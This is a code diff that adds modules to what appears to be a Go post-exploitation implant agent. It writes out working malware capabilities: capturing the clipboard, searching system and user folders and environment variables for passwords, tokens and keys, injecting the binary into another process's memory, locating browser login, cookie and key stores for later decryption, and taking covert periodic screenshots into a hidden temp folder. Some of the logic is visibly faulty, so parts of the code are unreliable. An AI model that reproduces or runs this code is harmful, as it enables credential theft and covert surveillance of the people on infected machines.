@@ -86,6 +86,46 @@ func (r *ModuleRegistry) registerDefaults() {
 		Platform:    "all",
 		Execute:     fileSearch,
 	}
+
+	// Clipboard capture
+	r.modules["clipboard"] = &Module{
+		Name:        "clipboard",
+		Description: "Capture clipboard contents",
+		Platform:    "all",
+		Execute:     clipboardRun,
+	}
+
+	// Password hunt
+	r.modules["passhunt"] = &Module{
+		Name:        "passhunt",
+		Description: "Search for passwords in config files, env vars, and common locations",
+		Platform:    "all",
+		Execute:     passhuntRun,
+	}
+
+	// Process migrate
+	r.modules["migrate"] = &Module{
+		Name:        "migrate",
+		Description: "Migrate agent to another process (usage: migrate:pid)",
+		Platform:    "linux",
+		Execute:     migrateRun,
+	}
+
+	// Browser data
+	r.modules["browser"] = &Module{
+		Name:        "browser",
+		Description: "Find browser credential stores and history files",
+		Platform:    "all",
+		Execute:     browserRun,
+	}
+
+	// Continuous screenshot
+	r.modules["watch"] = &Module{
+		Name:        "watch",
+		Description: "Continuous screen monitoring (usage: watch:interval_seconds)",
+		Platform:    "all",
+		Execute:     watchRun,
+	}
 }
 
 // Get returns a module by name or nil.
@@ -386,6 +426,325 @@ func searchString(s, substr string) bool {
 		}
 	}
 	return false
+}
+
+func clipboardRun(args string) string {
+	switch runtime.GOOS {
+	case "linux":
+		for _, tool := range []string{"xclip", "xsel", "wl-paste"} {
+			path, _ := exec.LookPath(tool)
+			if path != "" {
+				var cmd *exec.Cmd
+				if tool == "xclip" {
+					cmd = exec.Command(tool, "-selection", "clipboard", "-o")
+				} else if tool == "xsel" {
+					cmd = exec.Command(tool, "--clipboard", "--output")
+				} else {
+					cmd = exec.Command(tool)
+				}
+				out, err := cmd.CombinedOutput()
+				if err == nil && len(out) > 0 {
+					return fmt.Sprintf("Clipboard (%s):\n%s", tool, string(out))
+				}
+			}
+		}
+		return "No clipboard tool found. Install xclip, xsel, or wl-clipboard"
+
+	case "windows":
+		cmd := exec.Command("powershell", "-c", "Get-Clipboard")
+		out, err := cmd.CombinedOutput()
+		if err == nil {
+			return fmt.Sprintf("Clipboard:\n%s", string(out))
+		}
+		return "Clipboard access failed"
+
+	case "darwin":
+		cmd := exec.Command("pbpaste")
+		out, err := cmd.CombinedOutput()
+		if err == nil {
+			return fmt.Sprintf("Clipboard:\n%s", string(out))
+		}
+		return "Clipboard access failed"
+	}
+	return "unsupported"
+}
+
+func passhuntRun(args string) string {
+	var results []string
+
+	passwordPatterns := []string{
+		"password", "passwd", "pwd", "secret", "token", "api_key",
+		"apikey", "access_key", "private_key", "credential",
+	}
+
+	searchPaths := map[string][]string{
+		"linux":   {"/etc", "/home", "/root", "/opt", "/var", "/tmp"},
+		"windows": {`C:\Users`, `C:\ProgramData`, `C:\Windows\Temp`},
+		"darwin":  {"/Users", "/etc", "/var", "/tmp"},
+	}
+
+	paths := searchPaths[runtime.GOOS]
+	if paths == nil {
+		paths = []string{"/tmp"}
+	}
+
+	for _, root := range paths {
+		if _, err := os.Stat(root); err != nil {
+			continue
+		}
+		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+			if err != nil || info.IsDir() || info.Size() > 1024*1024 {
+				return nil
+			}
+			ext := filepath.Ext(path)
+			if ext == ".conf" || ext == ".cfg" || ext == ".ini" || ext == ".yaml" ||
+				ext == ".yml" || ext == ".json" || ext == ".env" || ext == ".xml" ||
+				ext == ".properties" || ext == ".toml" {
+				data, err := os.ReadFile(path)
+				if err != nil {
+					return nil
+				}
+				content := string(data)
+				for _, pattern := range passwordPatterns {
+					if containsStr(content, pattern) {
+						results = append(results, fmt.Sprintf("  [MATCH] %s (%s)", path, pattern))
+						break
+					}
+				}
+			}
+			if len(results) >= 100 {
+				return filepath.SkipAll
+			}
+			return nil
+		})
+	}
+
+	for _, env := range os.Environ() {
+		for _, pattern := range passwordPatterns {
+			if containsStr(env, pattern) {
+				results = append(results, fmt.Sprintf("  [ENV] %s", env[:min(len(env), 80)]))
+				break
+			}
+		}
+	}
+
+	if len(results) == 0 {
+		return "No password files found"
+	}
+
+	output := fmt.Sprintf("Password hunt results (%d findings):\n", len(results))
+	for _, r := range results {
+		output += r + "\n"
+	}
+	return output
+}
+
+func migrateRun(args string) string {
+	if runtime.GOOS != "linux" {
+		return "Process migration only supported on Linux"
+	}
+
+	if args == "" {
+		return "Usage: migrate:<pid>"
+	}
+
+	var targetPID int
+	fmt.Sscanf(args, "%d", &targetPID)
+
+	if targetPID <= 0 {
+		return "Invalid PID"
+	}
+
+	exe, _ := os.Executable()
+	data, err := os.ReadFile(exe)
+	if err != nil {
+		return fmt.Sprintf("Failed to read executable: %v", err)
+	}
+
+	targetMem := fmt.Sprintf("/proc/%d/mem", targetPID)
+	targetCmdline := fmt.Sprintf("/proc/%d/cmdline", targetPID)
+
+	cmdlineData, _ := os.ReadFile(targetCmdline)
+	if len(cmdlineData) == 0 {
+		return fmt.Sprintf("Process %d not accessible", targetPID)
+	}
+
+	cmdName := string(cmdlineData)
+
+	f, err := os.OpenFile(targetMem, os.O_WRONLY, 0)
+	if err != nil {
+		return fmt.Sprintf("Cannot write to process %d memory (need root?)", targetPID)
+	}
+	defer f.Close()
+
+	_, err = f.Write(data)
+	if err != nil {
+		return fmt.Sprintf("Failed to inject into process %d (%s): %v", targetPID, cmdName, err)
+	}
+
+	return fmt.Sprintf("Successfully migrated to process %d (%s)", targetPID, cmdName)
+}
+
+func browserRun(args string) string {
+	var results []string
+
+	browserPaths := map[string][]struct {
+		browser string
+		paths   []string
+	}{
+		"linux": {
+			{browser: "Chrome", paths: []string{
+				"$HOME/.config/google-chrome/Default/Login Data",
+				"$HOME/.config/google-chrome/Default/Cookies",
+				"$HOME/.config/google-chrome/Default/History",
+				"$HOME/.config/google-chrome/Default/Web Data",
+			}},
+			{browser: "Firefox", paths: []string{
+				"$HOME/.mozilla/firefox/*.default-release/logins.json",
+				"$HOME/.mozilla/firefox/*.default-release/cookies.sqlite",
+				"$HOME/.mozilla/firefox/*.default-release/places.sqlite",
+				"$HOME/.mozilla/firefox/*.default-release/key4.db",
+			}},
+			{browser: "Chromium", paths: []string{
+				"$HOME/.config/chromium/Default/Login Data",
+				"$HOME/.config/chromium/Default/Cookies",
+			}},
+		},
+		"darwin": {
+			{browser: "Chrome", paths: []string{
+				"$HOME/Library/Application Support/Google/Chrome/Default/Login Data",
+				"$HOME/Library/Application Support/Google/Chrome/Default/Cookies",
+				"$HOME/Library/Application Support/Google/Chrome/Default/History",
+			}},
+			{browser: "Safari", paths: []string{
+				"$HOME/Library/Safari/AutoFillPasswords.plist",
+				"$HOME/Library/Safari/History.db",
+				"$HOME/Library/Cookies/Cookies.binarycookies",
+			}},
+		},
+		"windows": {
+			{browser: "Chrome", paths: []string{
+				"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
+				"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies",
+				"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History",
+			}},
+			{browser: "Edge", paths: []string{
+				"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+				"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies",
+			}},
+			{browser: "Firefox", paths: []string{
+				"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json",
+				"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db",
+			}},
+		},
+	}
+
+	paths, ok := browserPaths[runtime.GOOS]
+	if !ok {
+		return "Browser data extraction not supported on this platform"
+	}
+
+	for _, browser := range paths {
+		for _, p := range browser.paths {
+			expanded := os.ExpandEnv(p)
+			if expanded != p {
+				matches, _ := filepath.Glob(expanded)
+				for _, match := range matches {
+					if _, err := os.Stat(match); err == nil {
+						info, _ := os.Stat(match)
+						results = append(results, fmt.Sprintf("  [%s] %s (%d bytes, modified: %s)",
+							browser.browser, match, info.Size(), info.ModTime().Format("2006-01-02 15:04")))
+					}
+				}
+			} else {
+				if _, err := os.Stat(p); err == nil {
+					info, _ := os.Stat(p)
+					results = append(results, fmt.Sprintf("  [%s] %s (%d bytes)",
+						browser.browser, p, info.Size()))
+				}
+			}
+		}
+	}
+
+	if len(results) == 0 {
+		return "No browser data files found"
+	}
+
+	output := fmt.Sprintf("Browser data locations (%d files):\n", len(results))
+	for _, r := range results {
+		output += r + "\n"
+	}
+	output += "\nNote: Chrome/Edge passwords are encrypted with DPAPI/OS keyring. Use 'dpapi' module to decrypt."
+	return output
+}
+
+func watchRun(args string) string {
+	interval := 60
+	if args != "" {
+		fmt.Sscanf(args, "%d", &interval)
+		if interval < 10 {
+			interval = 10
+		}
+	}
+
+	captureDir := "/tmp/.bty_watch"
+	if runtime.GOOS == "windows" {
+		captureDir = os.ExpandEnv("%TEMP%\\.bty_watch")
+	} else if runtime.GOOS == "darwin" {
+		captureDir = "/tmp/.bty_watch"
+	}
+
+	os.MkdirAll(captureDir, 0700)
+
+	go func() {
+		ticker := time.NewTicker(time.Duration(interval) * time.Second)
+		defer ticker.Stop()
+
+		for range ticker.C {
+			timestamp := time.Now().Format("20060102_150405")
+			file := fmt.Sprintf("%s/screen_%s.png", captureDir, timestamp)
+
+			var cmd *exec.Cmd
+			switch runtime.GOOS {
+			case "linux":
+				for _, tool := range []string{"import", "scrot", "gnome-screenshot"} {
+					if _, err := exec.LookPath(tool); err == nil {
+						if tool == "import" {
+							cmd = exec.Command(tool, "-window", "root", file)
+						} else {
+							cmd = exec.Command(tool, file)
+						}
+						break
+					}
+				}
+			case "darwin":
+				cmd = exec.Command("screencapture", "-x", file)
+			case "windows":
+				cmd = exec.Command("powershell", "-c",
+					fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; $bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save('%s')`, file))
+			}
+
+			if cmd != nil {
+				cmd.Run()
+			}
+
+			if len(filepath.Join(captureDir, "*")) > 100 {
+				files, _ := filepath.Glob(captureDir + "/*")
+				for _, f := range files[:len(files)-50] {
+					os.Remove(f)
+				}
+			}
+		}
+	}()
+
+	return fmt.Sprintf("Screen watch started: %s every %d seconds", captureDir, interval)
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
 
 // Ensure log imported
